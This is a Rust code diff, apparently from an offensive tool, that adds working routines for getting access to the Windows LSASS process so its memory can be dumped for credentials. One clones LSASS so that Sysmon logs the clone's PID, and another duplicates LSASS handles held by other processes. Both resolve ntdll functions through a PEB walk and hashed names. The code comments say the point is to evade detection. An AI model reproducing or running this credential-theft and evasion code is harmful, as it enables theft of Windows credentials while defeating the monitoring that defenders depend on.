@@ -188,23 +188,217 @@ pub fn open_lsass_direct(pid: u32) -> Result<ProcessHandle, String> {
     }
 }
 
-/// Method 2: Fork — open with CREATE_PROCESS access for cloning
+/// Method 2: Fork — Clone LSASS via NtCreateProcessEx
+///
+/// Creates a copy of the LSASS process that shares its address space.
+/// We dump the clone instead of the original — Sysmon Event 10 shows
+/// access to the clone PID, not the real LSASS PID.
 pub fn open_lsass_fork(pid: u32) -> Result<ProcessHandle, String> {
+    // Open LSASS with PROCESS_CREATE_PROCESS for cloning
+    let source = unsafe {
+        OpenProcess(PROCESS_CREATE_PROCESS, false, pid)
+            .map_err(|e| format!("OpenProcess(fork source) failed: {}", e))?
+    };
+
+    type FnNtCreateProcessEx = unsafe extern "system" fn(
+        *mut HANDLE,
+        u32,
+        *const u8,
+        HANDLE,
+        u32,
+        HANDLE,
+        HANDLE,
+        HANDLE,
+        u8,
+    ) -> i32;
+
     unsafe {
-        let h = OpenProcess(
-            PROCESS_ACCESS_RIGHTS(0x0080 | 0x0040 | 0x0400 | 0x0010),
-            false,
-            pid,
-        )
-        .map_err(|e| format!("OpenProcess(fork) failed: {}", e))?;
-        Ok(ProcessHandle { h })
+        let resolver = resolve_ntdll()?;
+        let hash = crate::resolver::djb2_hash(b"NtCreateProcessEx");
+        let fn_ptr = resolver.ntdll(hash).ok_or("NtCreateProcessEx not found")?;
+        let nt_create: FnNtCreateProcessEx = std::mem::transmute(fn_ptr);
+
+        let mut clone_handle = HANDLE::default();
+        let status = nt_create(
+            &mut clone_handle,
+            PROCESS_ALL_ACCESS.0,
+            std::ptr::null(),
+            source,
+            0,                 // Flags
+            HANDLE::default(), // SectionHandle
+            HANDLE::default(), // DebugPort
+            HANDLE::default(), // ExceptionPort
+            0,                 // InJob
+        );
+
+        let _ = CloseHandle(source);
+
+        if status < 0 {
+            return Err(format!("NtCreateProcessEx failed: 0x{:08X}", status as u32));
+        }
+
+        println!("    [+] LSASS forked (clone handle: {:?})", clone_handle.0);
+        Ok(ProcessHandle { h: clone_handle })
     }
 }
 
-/// Method 3: Dup — duplicate existing handle (fallback to direct)
+/// Method 3: Dup — Duplicate existing LSASS handle from another process
+///
+/// Scans the system handle table via NtQuerySystemInformation(SystemHandleInformation)
+/// to find processes already holding a handle to LSASS, then duplicates via
+/// NtDuplicateObject. No direct OpenProcess on LSASS PID needed.
 pub fn open_lsass_dup(pid: u32) -> Result<ProcessHandle, String> {
-    println!("    [!] Handle duplication: falling back to direct open");
-    open_lsass_direct(pid)
+    const SYSTEM_HANDLE_INFORMATION: u32 = 16;
+
+    #[repr(C)]
+    #[derive(Clone, Copy)]
+    struct SystemHandleEntry {
+        process_id: u16,
+        _creator_back_trace_index: u16,
+        _object_type: u8,
+        _handle_attributes: u8,
+        handle_value: u16,
+        _object: usize,
+        granted_access: u32,
+    }
+
+    type FnNtDuplicateObject =
+        unsafe extern "system" fn(HANDLE, HANDLE, HANDLE, *mut HANDLE, u32, u32, u32) -> i32;
+
+    unsafe {
+        let resolver = resolve_ntdll()?;
+
+        let nqsi: FnNtQuerySystemInformation = std::mem::transmute(
+            resolver
+                .ntdll(crate::resolver::djb2_hash(b"NtQuerySystemInformation"))
+                .ok_or("NtQuerySystemInformation not found")?,
+        );
+        let nt_dup: FnNtDuplicateObject = std::mem::transmute(
+            resolver
+                .ntdll(crate::resolver::djb2_hash(b"NtDuplicateObject"))
+                .ok_or("NtDuplicateObject not found")?,
+        );
+
+        // Query system handle table
+        let mut buf_size = 1024 * 1024 * 4u32;
+        let mut buffer: Vec<u8> = vec![0; buf_size as usize];
+        let mut ret_len = 0u32;
+
+        loop {
+            let status = nqsi(
+                SYSTEM_HANDLE_INFORMATION,
+                buffer.as_mut_ptr(),
+                buf_size,
+                &mut ret_len,
+            );
+            if status == 0 {
+                break;
+            }
+            if status == 0xC0000004u32 as i32 {
+                buf_size = ret_len + 65536;
+                buffer.resize(buf_size as usize, 0);
+            } else {
+                return Err(format!(
+                    "NtQuerySystemInformation failed: 0x{:08X}",
+                    status as u32
+                ));
+            }
+        }
+
+        let num_handles = *(buffer.as_ptr() as *const u32) as usize;
+        let entries_ptr =
+            buffer.as_ptr().add(std::mem::size_of::<usize>()) as *const SystemHandleEntry;
+        let my_pid = std::process::id() as u16;
+
+        println!(
+            "    [*] Scanning {} handles for LSASS (PID {})...",
+            num_handles, pid
+        );
+
+        for i in 0..num_handles {
+            let entry = &*entries_ptr.add(i);
+
+            // Skip own process, system, and LSASS itself
+            if entry.process_id == my_pid || entry.process_id <= 4 || entry.process_id == pid as u16
+            {
+                continue;
+            }
+
+            // Need PROCESS_VM_READ in granted access
+            if entry.granted_access & 0x0010 == 0 {
+                continue;
+            }
+
+            let source_pid = entry.process_id as u32;
+            let source_process = match OpenProcess(PROCESS_DUP_HANDLE, false, source_pid) {
+                Ok(h) => h,
+                Err(_) => continue,
+            };
+
+            let mut dup_handle = HANDLE::default();
+            let status = nt_dup(
+                source_process,
+                HANDLE(entry.handle_value as isize as *mut std::ffi::c_void),
+                GetCurrentProcess(),
+                &mut dup_handle,
+                PROCESS_ALL_ACCESS.0,
+                0,
+                0,
+            );
+
+            let _ = CloseHandle(source_process);
+
+            if status < 0 || dup_handle.is_invalid() {
+                continue;
+            }
+
+            // Verify duped handle points to LSASS
+            let check_pid = GetProcessId(dup_handle);
+            if check_pid == pid {
+                println!(
+                    "    [+] Duplicated handle from PID {} (handle 0x{:X})",
+                    source_pid, entry.handle_value
+                );
+                return Ok(ProcessHandle { h: dup_handle });
+            }
+
+            let _ = CloseHandle(dup_handle);
+        }
+
+        Err("No existing LSASS handle found in other processes".into())
+    }
+}
+
+/// Helper: resolve ntdll base and create a minimal ApiResolver
+fn resolve_ntdll() -> Result<crate::resolver::ApiResolver, String> {
+    unsafe {
+        let peb = get_peb();
+        let ldr = (*(peb as *const Peb64)).ldr;
+        let list_head = &(*ldr).in_memory_order_module_list as *const ListEntry;
+        let mut current = (*list_head).flink;
+        let mut ntdll_base: *mut u8 = std::ptr::null_mut();
+        while current != list_head as *mut _ {
+            let entry =
+                (current as *const u8).sub(std::mem::size_of::<ListEntry>()) as *const LdrEntry;
+            let name = &(*entry).base_dll_name;
+            if name.length > 0 && !name.buffer.is_null() {
+                let s = std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
+                if crate::resolver::djb2_hash_wide(s) == crate::resolver::HASH_NTDLL {
+                    ntdll_base = (*entry).dll_base;
+                    break;
+                }
+            }
+            current = (*current).flink;
+        }
+        if ntdll_base.is_null() {
+            return Err("ntdll not found".into());
+        }
+        Ok(crate::resolver::ApiResolver {
+            kernel32_base: std::ptr::null_mut(),
+            ntdll_base,
+            advapi32_base: std::ptr::null_mut(),
+        })
+    }
 }
 
 // Mini PEB structs
